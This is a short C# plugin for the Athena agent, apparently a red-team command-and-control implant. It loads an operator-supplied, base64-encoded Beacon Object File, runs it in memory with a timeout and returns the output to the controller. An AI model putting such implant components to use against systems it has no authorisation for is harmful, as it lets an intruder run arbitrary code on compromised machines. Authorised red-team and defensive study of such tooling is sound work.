using Athena.Plugins;
using System;
using System.Collections.Generic;
using System.IO;
using coff.coff;
namespace Plugins
{
    public class Coff : AthenaPlugin
    {
        public override string Name => "coff";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                //Need Args
                // asm - base64 encoded buffer of bof
                // functionName - name of function to be called
                // arguments - base64 encoded byteArray of bof arguments from beacon generate
                // timeout - timeout for thread to wait before killing bof execution (in seconds)


                //args.Add("asm", Convert.ToBase64String(File.ReadAllBytes(@"C:\Users\scott\Downloads\uptime.x64.o")));
                //args.Add("arguments", Convert.ToBase64String(new byte[] { }));
                //args.Add("functionName", "go");
                //args.Add("timeout", "30");
                //args.Add("task-id", "1");
                BofRunner br = new BofRunner(args);
                br.LoadBof();
                BofRunnerOutput bro = br.RunBof(30);
                PluginHandler.Write(bro.Output, args["task-id"], true);
            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
    }
}
